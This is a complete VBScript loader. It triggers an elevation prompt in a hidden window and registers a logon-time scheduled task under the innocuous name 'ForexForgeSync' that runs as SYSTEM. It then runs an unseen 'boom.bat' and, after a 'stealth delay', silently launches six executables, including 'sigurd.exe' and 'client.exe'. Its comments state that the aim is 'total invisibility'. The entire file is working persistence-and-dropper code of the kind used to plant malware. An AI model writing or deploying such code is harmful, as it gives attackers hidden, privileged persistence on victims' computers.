Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get paths and set current directory
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strScript = WScript.ScriptFullName
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION & INITIAL SETUP ---
' This only runs the VERY FIRST time you open the file manually
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    ' Trigger UAC prompt silently (0 = Hidden)
    UAC.ShellExecute "wscript.exe", Chr(34) & strScript & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: INSTALL THE SYSTEM-LEVEL TASK ---
' This registers the task to run as the SYSTEM account for total invisibility
strTaskName = "ForexForgeSync"
' /RU "SYSTEM" ensures the 30-second delay and launches happen in a hidden session
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr ""wscript.exe //B \""" & strScript & "\"" /task"" /sc onlogon /rl highest /ru ""SYSTEM"" /f"

' Execute the task creation hidden
WshShell.Run "cmd.exe /c " & strCreateTask, 0, True

' --- STEP 3: RUN BOOM.BAT (Only on first install) ---
If WScript.Arguments.Named.Exists("elevate") Then
    ' Run boom.bat hidden (0)
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 4: STEALTH DELAY ---
' This wait happens entirely in the background with NO window
WScript.Sleep 30000 

' --- STEP 5: LAUNCH THE 6 APPS ---
' Using absolute paths ensures the SYSTEM account finds them
' 0 = Hidden window, False = Do not wait for the app to close
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
